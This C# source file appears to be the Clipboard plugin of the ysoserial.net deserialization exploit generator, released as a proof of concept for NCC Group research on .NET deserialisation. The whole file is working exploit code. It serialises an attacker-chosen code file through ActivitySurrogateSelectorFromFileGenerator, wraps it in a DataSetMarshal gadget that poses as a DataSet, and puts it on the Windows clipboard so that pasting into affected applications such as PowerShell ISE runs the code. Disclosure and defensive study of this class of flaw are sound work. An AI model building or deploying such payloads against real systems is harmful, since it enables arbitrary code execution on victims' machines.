using System.Collections.Generic;
using NDesk.Options;
using System;
using ysoserial_frmv2.Generators;
using System.IO;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;
using System.Windows.Forms;
using System.Threading;

/**
 * Author: Soroush Dalili (@irsdl) from NCC Group (@NCCGroupInfosec)
 * 
 * Comments: 
 *  This was released as a PoC for NCC Group's research on `Use of Deserialisation in .NET Framework Methods` (December 2018)
 *  See `DataObject.SetData Method`: https://docs.microsoft.com/en-us/dotnet/api/system.windows.forms.dataobject.setdata 
 *  Security note was added after being reported: https://github.com/dotnet/dotnet-api-docs/pull/502
 *  It was possible to copy other objects into the clipboard but this plugin only utilises one method that is used in the DataSetMarshal class
 *  The object will be copied to the clipboard and can be pasted into other affected applications such as Windows PowerShell ISE
 *  This PoC produces an error and may crash the application
 **/

namespace ysoserial_frmv2.Plugins
{
    class ClipboardPlugin : Plugin
    {
        static string format = System.Windows.Forms.DataFormats.StringFormat;
        static string command = "";
        static Boolean test = false;

        static OptionSet options = new OptionSet()
            {
                {"F|format=", "the object format: Csv, DeviceIndependentBitmap, DataInterchangeFormat, PenData, RiffAudio, WindowsForms10PersistentObject, System.String, SymbolicLink, TaggedImageFileFormat, WaveAudio. Default: System.String", v => format = v },
                {"c|command=", "the command to be executed using ActivitySurrogateSelectorFromFileGenerator e.g. \"ExploitClass.cs; System.Windows.Forms.dll\"", v => command = v },
                {"t|test", "whether to run payload locally. Default: false", v => test =  v != null },
            };

        public string Name()
        {
            return "Clipboard";
        }

        public string Description()
        {
            return "Generates payload for DataObject and copy it into the clipboard - ready to be pasted in affected apps";
        }

        public OptionSet Options()
        {
            return options;
        }

        public object Run(string[] args)
        {
            // to solve this error: Current thread must be set to single thread apartment (STA) mode before OLE calls can be made
            // we cannot use the [STAThread] outside of this plugin
            // here is a solution
            var staThread = new Thread(delegate ()
            {
                List<string> extra;
                try
                {
                    extra = options.Parse(args);
                }
                catch (OptionException e)
                {
                    Console.Write("ysoserial: ");
                    Console.WriteLine(e.Message);
                    Console.WriteLine("Try 'ysoserial --help' for more information.");
                    System.Environment.Exit(-1);
                }

                object payload = "";
                if (String.IsNullOrEmpty(command) || String.IsNullOrEmpty(command.Trim()))
                {
                    Console.Write("ysoserial: ");
                    Console.WriteLine("Incorrect plugin mode/arguments combination");
                    Console.WriteLine("Try 'ysoserial --help' for more information.");
                    System.Environment.Exit(-1);
                }

                byte[] serializedData = (byte[])new ActivitySurrogateSelectorFromFileGenerator().Generate(command, "BinaryFormatter", false);
                MemoryStream ms = new MemoryStream(serializedData);
                DataSetMarshal payloadDataSetMarshal = new DataSetMarshal(ms);

                // Creates a new data object.
                DataObject myDataObject = new DataObject();

                myDataObject.SetData(format, false, payloadDataSetMarshal); // for System.Windows.Forms
                /*
                myDataObject.SetData(format, payloadDataSetMarshal, false); // for System.Windows
                */

                Clipboard.Clear();
                Clipboard.SetDataObject(myDataObject, true);

                if (test)
                {
                    // PoC on how it works in practice
                    IDataObject dataObj = Clipboard.GetDataObject();
                    Object test = dataObj.GetData(format);
                }
            });
            staThread.SetApartmentState(ApartmentState.STA);
            staThread.Start();
            staThread.Join();

            return "Object copied to the clipboard";
        }

        
        // Reference: https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf
        [Serializable]
        public class DataSetMarshal : ISerializable
        {
            object _fakeTable;
            MemoryStream _ms;
            public void GetObjectData(SerializationInfo info, StreamingContext context)
            {
                info.SetType(typeof(System.Data.DataSet));
                info.AddValue("DataSet.RemotingFormat", System.Data.SerializationFormat.Binary);
                info.AddValue("DataSet.DataSetName", "");
                info.AddValue("DataSet.Namespace", "");
                info.AddValue("DataSet.Prefix", "");
                info.AddValue("DataSet.CaseSensitive", false);
                info.AddValue("DataSet.LocaleLCID", 0x409);
                info.AddValue("DataSet.EnforceConstraints", false);
                info.AddValue("DataSet.ExtendedProperties", (System.Data.PropertyCollection)null);
                info.AddValue("DataSet.Tables.Count", 1);
                MemoryStream stm = new MemoryStream();
                if (_fakeTable != null)
                {
                    BinaryFormatter fmt = new BinaryFormatter();
                    fmt.Serialize(stm, _fakeTable);
                }
                else
                {
                    stm = _ms;
                }
                info.AddValue("DataSet.Tables_0", stm.ToArray());
            }

            public DataSetMarshal(object fakeTable)
            {
                _fakeTable = fakeTable;
            }
            public DataSetMarshal(MemoryStream ms)
            {
                _ms = ms;
            }
        }
    }
}
